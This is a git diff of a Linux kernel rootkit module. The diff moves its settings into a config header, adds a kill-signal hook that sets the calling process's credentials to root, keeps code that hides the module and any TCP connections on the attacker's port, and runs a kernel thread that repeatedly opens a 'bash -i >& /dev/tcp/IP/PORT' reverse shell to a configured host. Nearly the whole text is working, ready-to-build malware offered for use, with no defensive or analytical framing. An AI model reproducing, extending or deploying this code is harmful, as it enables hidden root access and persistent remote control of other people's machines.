@@ -5,23 +5,15 @@
 #include <linux/tcp.h>
 
 #include "ftrace_helper.h"
+#include "config.h"
 
-#define TRUE 1
-#define FALSE 0
-
-#define SIGHIDE 59
-#define TIMETOSHELL 30
-#define HIDENPORT 1337
-#define CANBEUNHIDE 0
 
 MODULE_LICENSE("GPL");
 MODULE_AUTHOR("Diego Tellaroli");
-MODULE_DESCRIPTION("GPL");
+MODULE_DESCRIPTION("hauhaua");
 
 
 static int hide_status = 0;
-static asmlinkage long(*orig_kill)(const struct pt_regs *);
-
 
 static void hide_sysfs(void) {
     if (THIS_MODULE->mkobj.kobj.state_initialized) {
@@ -50,25 +42,47 @@ void module_show(void)
  hide_status = 0;
 }
 
+void spawnRoot(void){
+    struct cred *newcredentials;
+    newcredentials = prepare_creds();
 
-static asmlinkage int hook_kill(const struct pt_regs *regs){
- void module_show(void);
-
- int signal;
- signal = regs->si;
-
- if(signal == SIGHIDE){
-    if(hide_status == 1){
-        if(CANBEUNHIDE == TRUE){
-            module_show();
-        }
-    }else{
-        module_hide();
+    if(newcredentials == NULL){
+        return;
     }
-  return 0;
- }
 
- return orig_kill(regs);
+    newcredentials->uid.val = 0;
+    newcredentials->gid.val = 0;
+    newcredentials->suid.val = 0;
+    newcredentials->fsuid.val = 0;
+    newcredentials->euid.val = 0;
+
+    commit_creds(newcredentials);
+}
+
+static asmlinkage long(*orig_kill)(const struct pt_regs *);
+static asmlinkage int hook_kill(const struct pt_regs *regs){
+    void module_show(void);
+    void spawnRoot(void);
+
+    int signal;
+    signal = regs->si;
+
+    if(signal == SIGHIDE){
+        if(hide_status == 1){
+            if(CANBEUNHIDE == TRUE){
+                module_show();
+            }
+        }else{
+            module_hide();
+        }
+    return 0;
+    }
+    
+    if(signal == ROOT_SIGNAL){
+        spawnRoot();
+        return 0;
+    }
+    return orig_kill(regs);
 }
 
 /*
@@ -87,7 +101,7 @@ static asmlinkage long hook_tcp4_seq_show(struct seq_file *seq, void *v)
      * If sk doesn't point to anything, then it points to 0x1
      * It will hide the destination port 1337 so that our reverse shell becomes undetectable
      */
-    if (sk != 0x1 && sk->sk_dport == htons(HIDENPORT))
+    if (sk != 0x1 && sk->sk_dport == htons(SRV_PORT))
         return 0;
     /*
      * Otherwise, just return with the real tcp4_seq_show()
@@ -104,9 +118,10 @@ struct task_struct *task; // Structure used to represent tasks (processes) in th
 
 int mon_shell(void *data) {     // Function that will be executed by the kernel thread (mon_thread).
     while (!kthread_should_stop()) {  // Checks if the thread should stop.
-
+            char revshell[256];
+            snprintf(revshell, sizeof(revshell), "bash -i >& /dev/tcp/%s/%d 0>&1", SRV_IP, SRV_PORT);
             call_usermodehelper("/bin/bash",
-                                (char *[]){"/bin/bash", "-c", "bash -i >& /dev/tcp/192.168.0.211/1337 0>&1", NULL},
+                                (char *[]){"/bin/bash", "-c", revshell, NULL},
                                 NULL, UMH_WAIT_EXEC);
 
 
